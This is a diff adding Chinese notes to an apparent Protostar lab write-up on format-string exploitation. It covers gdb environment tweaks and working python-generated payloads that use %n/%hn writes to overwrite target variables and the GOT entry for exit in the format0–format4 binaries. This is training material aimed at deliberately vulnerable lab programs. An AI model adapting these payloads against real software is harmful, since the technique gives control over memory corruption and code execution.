@@ -244,3 +244,103 @@ Done！
 ##Stack7 
 
 同第六题，只是cmd的位置需要重找一下`cmd = 0x80482cc + 3`
+
+##String Format Exploiting
+
+先学了一下什么是格式化字符漏洞，及其利用方法：[http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)
+
+重点是利用`‘$n’`，反复试了几次，发现以下几点需要注意：
+
+* 引号还是要用单引号，双引号不work.
+* `$n`符号是改变的对应的地址指向的值。比如`print('$2$n', i, j)`,改变的是`&j`的值，即j做为地址指向的值。
+
+去掉环境变量，使调试器里外栈的值一样。
+
+```
+$ env -i /usr/bin/printenv
+$ gdb -q /usr/bin/printenv
+Reading symbols from /usr/bin/printenv...(no debugging symbols found)...done.
+(gdb) unset env
+Delete all environment variables? (y or n) y
+(gdb) r
+Starting program: /usr/bin/printenv 
+PWD=/home/ppp
+SHLVL=0
+```
+
+```
+$ env -i PWD=$(pwd) SHLVL=0 ./a.out "$(python -c 'print "my_exploit_string"')" # Outside gdb.
+$ gdb ./a.out # Inside gdb.
+(gdb) unset env
+Delete all environment variables? (y or n) y
+(gdb) r "$(/usr/bin/python -c 'print "my_exploit_string"')"
+```
+
+通用型，调试开始32bit参数:`"$(python -c 'import sys; sys.stdout.write("sh;#AAAABBBB%00000x%106$hp%00000x%107$hp")')"`
+
+##Format0
+
+```
+./format0 "$(python -c 'import sys; sys.stdout.write("%64x\xef\xbe\ad\de")')"
+```
+
+##Format1
+
+`objdump -t format1`,得到`target`的地址：`0x08049638`
+
+```
+#第一步，先找到字符串在栈上的位置，这里确定113,和114两个值
+env -i PWD=$(pwd) ./format1 "$(python -c 'import sys; sys.stdout.write("AAAABBBB%00000x%113$hp%00000x%114$hp")')"
+#第二步，尝试将要该改写的target地址写进去，试着能否还能打印出来
+env -i PWD=$(pwd) ./format1 "$(python -c 'import sys; sys.stdout.write("\x38\x96\x04\x08\x3a\x96\x04\x08%00001x%113$hp%00002x%114$hp")')"
+#第三步，将p换成n，将随便给一些值，将相应的值写进target里，如果要求写成0xdeadbeef
+env -i PWD=$(pwd) ./format1 "$(python -c 'import sys; sys.stdout.write("\x38\x96\x04\x08\x3a\x96\x04\x08%48871x%113$hn%08126x%114$hn")')"
+```
+
+##Format2
+
+`objdump -t format1`,得到`target`的地址：`0x080496e4`
+
+```
+在GDB里：
+stdin:
+AAAABBBB%00000x%4$hp%00000x%5$hp
+
+将之写到文件里
+python -c 'import sys; sys.stdout.write("\xe4\x96\x04\x08%00060x%4$hn")' > input2
+
+从文件读取：
+user@protostar:/opt/protostar/bin$ env -i PWD=$(pwd) ./format2 </tmp/input2 
+000000000000000000000000000000000000000000000000000000000200you have modified the target :)
+```
+
+##Format3
+
+```
+target的值080496f4
+要改的值：
+高位：0x0102
+低位：0x5544
+
+探查位置:
+AAAABBBB%00000x%12$hp%00000x%13$hp
+
+python -c 'import sys; sys.stdout.write("\xf6\x96\x04\x08\xf4\x96\x04\x08%00250x%12$hn%21570x%13$hn")' > input3
+#"<"符又患毛病了，改用cat就work了
+env -i PWD=$(pwd) cat /tmp/input3 |./format3
+```
+
+##Format4
+
+`objdump -TR`来查看GOT表
+
+```
+exit    0x08049724
+
+hello   
+高位：0x0804
+低位：0x84b4
+
+python -c 'import sys; sys.stdout.write("\x26\x97\x04\x08\x24\x97\x04\x08%02044x%4$hn%31920x%5$hn")' > input4
+env -i PWD=$(pwd) cat /tmp/input4 |./format4
+```
